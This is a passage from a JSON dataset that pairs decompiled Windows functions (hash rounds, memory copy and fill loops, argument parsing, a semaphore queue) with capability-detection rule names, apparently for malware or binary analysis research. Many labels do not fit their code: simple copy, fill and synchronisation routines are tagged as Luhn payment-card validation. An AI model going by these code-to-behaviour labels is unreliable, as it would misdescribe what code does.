0x19) ^\n              (*(arg_8h + -0x3c + var_4h * 4) >> 0x12 | *(arg_8h + -0x3c + var_4h * 4) << 0xe) ^\n             *(arg_8h + -0x3c + var_4h * 4) >> 3) + *(arg_8h + -0x40 + var_4h * 4) + 0x100 + var_4h;\n    }\n    *(arg_8h + 0x1080) = 0;\n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        *(arg_8h + 0x1000 + var_4h * 4) = *(arg_8h + 0x7c0 + var_4h * 4);\n    }\n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        *(arg_8h + 0x1040 + var_4h * 4) = *(arg_8h + 0xfc0 + var_4h * 4);\n    }\n    for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n        fcn.0040a2c0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 1344
    },
    "0040c780": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c780(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t var_4h;\n    \n    *(arg_8h + 0x10c4) = arg_10h;\n    *(arg_8h + 0x10c8) = arg_14h;\n    for (var_4h = 0; var_4h < arg_10h >> 5; var_4h = var_4h + 1) {\n        *(arg_8h + 0x1084 + var_4h * 4) = *(arg_ch + var_4h * 4);\n    }\n    for (; var_4h < 8; var_4h = var_4h + 1) {\n        *(arg_8h + 0x1084 + var_4h * 4) = *(arg_8h + 0x1074 + var_4h * 4);\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "00401e00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401e00(int32_t arg_8h, int32_t arg_ch, uint16_t *arg_10h)\n\n{\n    uint32_t in_EAX;\n    uint16_t *puVar1;\n    uint32_t var_8h;\n    uint16_t *var_4h;\n    \n    var_8h = 1;\n    while( true ) {\n        if (arg_8h <= var_8h) {\n            return in_EAX & 0xffffff00;\n        }\n        var_4h = *(arg_ch + var_8h * 4);\n        puVar1 = *var_4h;\n        if (puVar1 == 0x2d) break;\n        in_EAX = var_8h + 1;\n        var_8h = in_EAX;\n    }\n    while (*var_4h == 0x2d) {\n        puVar1 = var_4h + 1;\n        var_4h = puVar1;\n    }\n    for (; (*arg_10h != 0 && (puVar1 = *var_4h,  *arg_10h == puVar1)); arg_10h = arg_10h + 1) {\n        var_4h = var_4h + 1;\n    }\n    return CONCAT31(puVar1 >> 8, 1);\n}\n",
        "token_count": 305
    },
    "00401e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00401e90(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t *piVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 1;\n    do {\n        if (arg_8h <= var_4h) {\n            return NULL;\n        }\n        piVar1 = *(arg_ch + var_4h * 4);\n        if (*piVar1 == 0x2d) {\n            var_8h = var_8h + 1;\n        }\n        else if ((var_4h - var_8h) + -1 == arg_10h) {\n            return piVar1;\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 211
    },
    "00403cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00403cd0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00410da0();\n    fcn.00410d70((iVar1 >> 0x1f) >> 6);\n    return;\n}\n",
        "token_count": 101
    },
    "00403fc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9ch\n\nvoid __cdecl fcn.00403fc0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_9ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    fcn.00402200(&var_9ch, arg_ch, arg_10h);\n    fcn.00403690(&var_9ch);\n    fcn.00403d50(&var_9ch);\n    fcn.00410b50(arg_8h, &var_9ch, 0x50);\n    fcn.00410cf7(var_9ch);\n    return;\n}\n",
        "token_count": 170
    },
    "00404d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9ch\n\nvoid __cdecl fcn.00404d20(uint arg_8h, uint arg_ch)\n\n{\n    uint var_9ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    fcn.00404030(&var_9ch, arg_ch);\n    fcn.00403690(&var_9ch);\n    fcn.00403d50(&var_9ch);\n    fcn.00410b50(arg_8h, &var_9ch, 0x50);\n    fcn.00410cf7(var_9ch);\n    return;\n}\n",
        "token_count": 159
    },
    "00405e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4cch\n\nvoid __cdecl\nfcn.00405e10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint var_4cch;\n    uint var_434h;\n    uint var_39ch;\n    uint var_34ch;\n    uint var_2b4h;\n    uint var_21ch;\n    uint var_1cch;\n    uint var_184h;\n    uint var_ech;\n    uint var_9ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    fcn.00410b50(&var_39ch, arg_18h, 0x50);\n    fcn.004020e0(arg_18h, arg_1ch);\n    fcn.00402160(arg_1ch, &var_39ch);\n    fcn.00410b50(&var_ech, arg_20h, 0x50);\n    fcn.004020e0(arg_20h, arg_24h);\n    fcn.00402160(arg_24h, &var_ech);\n    fcn.00402200(&var_184h, arg_20h, arg_1ch);\n    fcn.00402200(&var_9ch, arg_18h, arg_24h);\n    fcn.00403690(&var_184h);\n    fcn.00403d50(&var_184h);\n    fcn.00403690(&var_9ch);\n    fcn.00403d50(&var_9ch);\n    fcn.00410b50(&var_ech, &var_184h, 0x50);\n    fcn.004020e0(&var_184h, &var_9ch);\n    fcn.00402160(&var_9ch, &var_ech);\n    fcn.00404d20(&var_4cch, &var_184h);\n    fcn.00404d20(&var_434h, &var_9ch);\n    fcn.00402200(&var_9ch, &var_434h, arg_28h);\n    fcn.00403690(&var_9ch);\n    fcn.00403d50(&var_9ch);\n    fcn.00410b50(arg_10h, &var_4cch, 0x50);\n    fcn.00410b50(arg_14h, &var_9ch, 0x50);\n    fcn.00404d20(&var_34ch, arg_18h);\n    fcn.00404d20(&var_2b4h, arg_1ch);\n    fcn.00402200(arg_8h, &var_34ch, &var_2b4h);\n    fcn.00403690(arg_8h);\n    fcn.00403d50(arg_8h);\n    fcn.00402160(&var_2b4h, &var_34ch);\n    fcn.00410b20(&var_1cch, 0, 0x48);\n    fcn.004021b0(&var_21ch, &var_2b4h, 0x1db41, 0);\n    fcn.00403d50(&var_21ch);\n    fcn.004020e0(&var_21ch, &var_34ch);\n    fcn.00402200(arg_ch, &var_2b4h, &var_21ch);\n    fcn.00403690(arg_ch);\n    fcn.00403d50(arg_ch);\n    fcn.00410cf7(var_4cch);\n    return;\n}\n",
        "token_count": 871
    },
    "0040cf00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cf00(int32_t arg_8h)\n\n{\n    int32_t var_4h;\n    \n    fcn.0040d5d0(arg_8h);\n    *(arg_8h + 0xc0) = 0;\n    for (var_4h = 0; var_4h < 4; var_4h = var_4h + 1) {\n        *(arg_8h + 0xc4 + var_4h * 4) = 0;\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "0040d570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_d8h\n\nvoid __cdecl fcn.0040d570(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_d8h;\n    uint in_stack_ffffff28;\n    uint in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint in_stack_ffffff94;\n    uint var_4h;\n    \n    fcn.0040cf00(&var_d8h);\n    fcn.0040cf50(&var_d8h, arg_8h, arg_ch);\n    fcn.0040d220(&var_d8h, arg_10h, var_d8h, in_stack_ffffff28, in_stack_ffffff2c, in_stack_ffffff30, in_stack_ffffff34\n                 , in_stack_ffffff38, in_stack_ffffff3c, in_stack_ffffff40, in_stack_ffffff44, in_stack_ffffff48, \n                 in_stack_ffffff4c, in_stack_ffffff50, in_stack_ffffff54, in_stack_ffffff58, in_stack_ffffff5c, \n                 in_stack_ffffff60, in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, in_stack_ffffff70, \n                 in_stack_ffffff74, in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, in_stack_ffffff84, \n                 in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, in_stack_ffffff94);\n    fcn.00410cf7(var_d8h);\n    return;\n}\n",
        "token_count": 552
    },
    "0040d5d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d5d0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n        uVar1 = *(var_4h * 8 + 0x40181c);\n        *(arg_8h + var_4h * 8) = *(var_4h * 8 + 0x401818);\n        *(arg_8h + 4 + var_4h * 8) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00410b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410b20(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < arg_10h; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h) = arg_ch;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00410b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410b50(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < arg_10h; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h) = *(arg_ch + var_4h);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00410b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410b90(int32_t arg_8h)\n\n{\n    *0x4110d4 = arg_8h;\n    *0x4110d8 = fcn.00410af0(arg_8h << 2);\n    *0x4110b4 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreA)(0, *0x4110d4, *0x4110d4, 0);\n    *0x4110b8 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreA)(0, 0, *0x4110d4, 0);\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x4110bc);\n    return;\n}\n",
        "token_count": 160
    },
    "00410c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __fastcall fcn.00410c90(uint param_1)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x4110b8, 0xffffffff, param_1);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4110bc);\n    uVar1 = *(*0x4110d8 + *0x4110e0 * 4);\n    *0x4110e0 = (*0x4110e0 + 1) % *0x4110d4;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4110bc);\n    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x4110b4, 1, 0);\n    return uVar1;\n}\n",
        "token_count": 199
    }
}